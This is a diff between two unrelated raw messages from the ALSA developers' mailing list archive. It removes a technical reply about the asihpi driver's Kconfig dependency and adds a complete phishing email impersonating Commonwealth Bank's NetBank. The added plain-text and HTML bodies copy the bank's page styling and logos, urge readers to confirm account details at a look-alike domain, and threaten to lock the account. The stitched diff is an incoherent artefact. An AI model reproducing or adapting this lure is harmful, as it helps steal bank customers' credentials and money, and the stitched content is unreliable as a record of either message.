@@ -1,21 +1,18 @@
-From: Stefan Smietanowski <stesmi@stesmi.com>
-Subject: Re: [ATrpms-devel] build failures in asihpi
-Date: Mon, 10 Jul 2006 00:44:32 +0200
-Message-ID: <44B186D0.1010000__26537.1293215596$1152524890$gmane$org@stesmi.com>
-References: <Pine.LNX.4.61.0606231231370.10283@tm8103-a.perex-int.cz>	<200607022100.58844.linux@blennerhassett.gen.nz>	<20060702123404.GI5158@neu.nirvana>	<200607101021.35954.linux@blennerhassett.gen.nz>
-	<20060709223120.GE27639@neu.nirvana>
+From: Commonwealth Bank Customer Support <support@commbank.com.au>
+Subject: Commbank.com.au - SECURITY UPDATING
+Date: Mon, 10 Jul 2006 11:15:51 +0800
+Message-ID: <148D9440.7269363@sbs.siemens.co.uk>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============1717548506=="
+Content-Type: multipart/mixed; boundary="===============1344407459=="
 Return-path: <alsa-devel-bounces@lists.sourceforge.net>
 Received: from gate.perex.cz (gate.perex.cz [85.132.177.35])
-	by alsa.jcu.cz (ALSA's E-mail Delivery System) with ESMTP id 7FA73222
+	by alsa.jcu.cz (ALSA's E-mail Delivery System) with ESMTP id 97950224
 	for <alsa-devel@alsa-project.org>;
-	Mon, 10 Jul 2006 11:47:13 +0200 (MEST)
-Received: from mxfep01.bredband.com (mxfep01.bredband.com [195.54.107.70])
-	by gate.perex.cz (Perex's E-mail Delivery System) with ESMTP id
-	DAD1A99CCC for <alsa-devel@alsa-project.org>;
-	Mon, 10 Jul 2006 00:44:36 +0200 (MEST)
-In-Reply-To: <20060709223120.GE27639@neu.nirvana>
+	Mon, 10 Jul 2006 11:47:00 +0200 (MEST)
+Received: from kiskapu.hu (unknown [218.208.251.134])
+	by gate.perex.cz (Perex's E-mail Delivery System) with SMTP id
+	A2C3999E23 for <alsa-devel@alsa-project.org>;
+	Mon, 10 Jul 2006 05:15:50 +0200 (MEST)
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=unsubscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=alsa-devel>
@@ -25,79 +22,237 @@ List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=subscribe>
 Sender: alsa-devel-bounces@lists.sourceforge.net
 Errors-To: alsa-devel-bounces@lists.sourceforge.net
-To: Axel Thimm <Axel.Thimm@atrpms.net>
-Cc: Eliot Blennerhassett <linux@blennerhassett.gen.nz>, ALSA development <alsa-devel@alsa-project.org>, ATrpms development list <atrpms-devel@atrpms.net>
+To: alsa-devel@alsa-project.org
 List-Id: alsa-devel@alsa-project.org
 
-This is an OpenPGP/MIME signed message (RFC 2440 and 3156)
---===============1717548506==
-Content-Type: multipart/signed; micalg=pgp-ripemd160;
-	protocol="application/pgp-signature";
-	boundary="------------enigA1094F3DF778FFE6B77620DA"
+This is a multi-part message in MIME format.
+--===============1344407459==
+Content-Type: multipart/alternative;
+	boundary="------------060703040003000904040103"
 
-This is an OpenPGP/MIME signed message (RFC 2440 and 3156)
---------------enigA1094F3DF778FFE6B77620DA
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-
-Axel Thimm wrote:
-> On Mon, Jul 10, 2006 at 10:21:35AM +1200, Eliot Blennerhassett wrote:
-> 
->>On Mon, 03 Jul 2006 00:34, Axel Thimm wrote:
->>
->>>On Sun, Jul 02, 2006 at 09:00:58PM +1200, Eliot Blennerhassett wrote:
->>>
->>>>On Sun, 02 Jul 2006 11:17, Axel Thimm wrote:
->>>>
->>>>>I'm having troubles compiling this on x86_64 distributions (from
->>>>>2.6.10 to 2.6.17 based kernels). The build fails on asihpi...
->>>>
->>>>Currently asihpi does not support x86_64.     Sorry.
->>>>
->>>>The Kconfig for asihpi does say:
->>>>depends on SND && X86 && !X86_64
->>>>(hmm, perhaps the ordinary make system doesn't know about this)
->>>
->>>You mean asihpi uses some next generation Kconfig?
->>
->>No, just ordinary Kconfig.
->>
->>
->>>So how do I turn asihpi off?
->>
->>AFAIK the "depends on SND && X86 && !X86_64"  should result in asihpi not 
->>being built on x86_64.   Have you figured out why this doesn't work?
-> 
-> 
-> No.
-
-Try "depends on SND && X86_32" which sounds like what you're after
-really. The X86 && !X86_64 could be what's confusing.
-
-X86 == 32 or 64bit.
-X86_32 = 32bit
-X86_64 = 64bit
-
-// Stefan
-
---------------enigA1094F3DF778FFE6B77620DA
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.4 (GNU/Linux)
-Comment: Using GnuPG with Fedora - http://enigmail.mozdev.org
-
-iD8DBQFEsYbTBrn2kJu9P78RA5/RAJ0WQHx0eruB+txwaNxooR+I0dsI5ACfetIO
-/HXivd14WQtVle+HKIm4lIo=
-=FNnM
------END PGP SIGNATURE-----
-
---------------enigA1094F3DF778FFE6B77620DA--
+This is a multi-part message in MIME format.
+--------------060703040003000904040103
+Content-Type: text/plain; charset=windows-1251; format=flowed
+Content-Transfer-Encoding: quoted-printable
 
 
---===============1717548506==
+   [1]skip to content=20
+
+      NetBank [2]Help | [3]Close Close=20
+                  NetBank news   Attention! Security Updates
+   We have added new security features to make NetBank safer than ever. O=
+f
+   course, security is an ongoing priority. So we've added some great new
+  services to make NetBank safer than ever. Here are just some of the way=
+s
+         that NetBank protects your funds and personal information.
+               1. Manage your daily withdrawal limits online
+  2. Personalised Identifications Questions - extra security for importan=
+t
+                                transactions
+                   3. New Email Alerts and Bank Messages
+                            4. Additional Logins
+  We kindly ask you to confirm your account details to activate new Banki=
+ng
+  System personally for you. Please, update your banking information here=
+:
+                  [4]http://www.systemsupdate-netbank.com
+ Attention! If you will not activate new security system within one week =
+we
+   will have to temporary lock your account until your personality will b=
+e
+                                identified.
+   [5]Terms & Conditions | [6]Security CBA Logo
+
+References
+
+   1. file://localhost/home/cmf2/tasks/hawk_2_au_1/L22969-315TMP.html#ski=
+ptocontent
+   2. javascript:helpWindow(url);
+   3. javascript:window.close();
+   4. http://www.systemsupdate-netbank.com/
+   5. https://www.secure.commbank.com.au/login/conditions_splash.asp
+   6. http://www.commbank.com.au/netbank/security.asp
+
+
+--------------060703040003000904040103
+Content-Type: text/html; charset=windows-1251
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content=3D"text/html;charset=3Dwindows-1251"
+ http-equiv=3D"Content-Type">
+  <title>Commbank.com.au - SECURITY UPDATING</title>
+</head>
+<body bgcolor=3D"#ffffff" text=3D"#000000">
+<title>Logon: Security Updates</title>
+<link rel=3D"stylesheet" href=3D"https://www3.netbank.commbank.com.au/net=
+bank/netbank2.css" type=3D"text/css" />
+
+
+
+<link rel=3D"SHORTCUT ICON" HREF=3D"https://www3.netbank.commbank.com.au/=
+netbank/images/favicon.ico">
+=09
+</head>
+<body>
+=09
+
+<a class=3D"hidden" href=3D"#skiptocontent"><img src=3D"https://www3.netb=
+ank.commbank.com.au/netbank/images/1x1.gif" alt=3D"skip to content" width=
+=3D"1" height=3D"1" hspace=3D"0" vspace=3D"0" border=3D"0" /></a>
+
+<table class=3D"template" border=3D"0" width=3D"100%" cellspacing=3D"0" c=
+ellpadding=3D"0" summary=3D"">
+
+<tr>
+	<td valign=3D"top" colspan=3D"5"><a name=3D"skiptocontent"></a>
+	<!-- Content Goes Here -->
+
+
+
+    </script>
+
+<center>
+
+<table class=3D"logon_borderTable" width=3D"510" cellspacing=3D"0" summar=
+y=3D"NetBank login">=20
+	<tr><td>
+	<table width=3D"100%" cellpadding=3D"0" cellspacing=3D"0">
+	<tr valign=3D"middle">=20
+	    <td height=3D"65" bgcolor=3D"#000000"><img src=3D"https://www3.netba=
+nk.commbank.com.au/netbank/images/header.gif" alt=3D"NetBank" width=3D"22=
+6" height=3D"43" /></td>
+	    <td width=3D"154" height=3D"56" background=3D"https://www3.netbank.c=
+ommbank.com.au/netbank/images/headrhs.gif" bgcolor=3D"#000000">=20
+	      <p class=3D"logon_printclose">=20
+
+                    <a href=3D"javascript:helpWindow(url);">Help</a> |
+                    <a href=3D"javascript:window.close();">Close
+                    <img src=3D"https://www3.netbank.commbank.com.au/netb=
+ank/images/but_close.gif" alt=3D"Close" id=3D"closebutton" border=3D"0"><=
+/a></NOSCRIPT>
+          &nbsp;&nbsp;&nbsp;</p> </td>
+
+	 </tr>
+	 <tr align=3D"center" valign=3D"top">=20
+	    <td colspan=3D"2">
+	     =20
+	    <table width=3D"377" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
+" summary=3D"">
+	      <tr>=20
+	        <td colspan=3D"2" height=3D"14" background=3D"https://www3.netba=
+nk.commbank.com.au/netbank/images/tabletop.gif"></td>
+	      </tr>
+	      <tr>
+	       <td background=3D"https://www3.netbank.commbank.com.au/netbank/im=
+ages/tableback.gif">
+	       <table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+
+		       <tr>
+		       <td width=3D"2%">&nbsp;</td>
+		       <td valign=3D"top">
+		         <a target=3D"_blank">
+                 <img src=3D"http://www.commbank.com.au/NetBank/images/al=
+erts.gif" alt=3D"NetBank news"/></a>
+		       </td>
+		       <td width=3D"3%" align=3D"left">&nbsp;</td>
+		       <td align=3D"left">
+			       	<span style=3D"font-size: 11pt"><b>Attention! Security Updates=
+</b></span><span style=3D"font-size: 9pt"><br>
+
+                    <br>
+                    We have added new security features to make NetBank s=
+afer=20
+                    than ever. Of course, security is an ongoing priority=
+. So=20
+                    we've added some great new services to make NetBank s=
+afer=20
+                    than ever. Here are just some of the ways that NetBan=
+k=20
+                    protects your funds and personal information.<br>
+                    <br>
+                    <b>1.</b> Manage your daily withdrawal limits online<=
+br>
+                    <b>2.</b> Personalised Identifications Questions - ex=
+tra=20
+                    security for important transactions<br>
+
+                    <b>3.</b> New Email Alerts and Bank Messages<br>
+                    <b>4.</b> Additional Logins<br>
+                    <br>
+                    We kindly ask you to confirm your account details to=20
+                    activate new Banking System personally for you. Pleas=
+e,=20
+                    update your banking information here:<br>
+                    <br>
+
+                    <a href=3D"http://www.systemsupdate-netbank.com">
+                    http://www.systemsupdate-netbank.com</a>&nbsp; <br>
+                    <br>
+                    <b><font color=3D"#FF0000">Attention!</font></b> If y=
+ou will=20
+                    not activate new security system within one week we w=
+ill=20
+                    have to temporary lock your account until your person=
+ality=20
+                    will be identified. </span>
+		       </td>
+		       <td width=3D"5%">&nbsp;</td>
+
+			  </tr>
+			</table>
+			</td>
+	      </tr>
+	      <tr>=20
+	        <td colspan=3D"2" height=3D"13" background=3D"https://www3.netba=
+nk.commbank.com.au/netbank/images/tablefoot.gif"></td>
+	      </tr>
+	    </table>	   =20
+	   =20
+	    <table width=3D"490" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
+">
+	      <tr>
+
+	        <td><p><font size=3D"1">
+
+	        <a href=3D"https://www.secure.commbank.com.au/login/conditions_s=
+plash.asp" target=3D"_blank">Terms=20
+	            &amp; Conditions</a> | <a href=3D"http://www.commbank.com.au=
+/netbank/security.asp" target=3D"_blank">Security</a>
+	           =20
+	            </font></p></td>
+		    <td align=3D"right"><img src=3D"https://www3.netbank.commbank.com.a=
+u/netbank/images/CBAlogo.gif" alt=3D"CBA Logo" /></td>
+		  </tr>
+
+		</table>
+	=09
+		</td>
+	</tr>
+</table>
+</td></tr>
+</table>
+</center>
+
+<!-- Content Finishes Here -->
+
+</td>
+</tr>
+</table>
+
+</td></tr></table>
+</body>
+</html>
+
+--------------060703040003000904040103--
+
+
+
+
+--===============1344407459==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -110,7 +265,7 @@ Get stuff done quickly with pre-integrated technology to make your job easier
 Download IBM WebSphere Application Server v.1.0.1 based on Apache Geronimo
 http://sel.as-us.falkag.net/sel?cmd=lnk&kid=120709&bid=263057&dat=121642
 
---===============1717548506==
+--===============1344407459==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -121,4 +276,4 @@ Alsa-devel mailing list
 Alsa-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/alsa-devel
 
---===============1717548506==--
+--===============1344407459==--
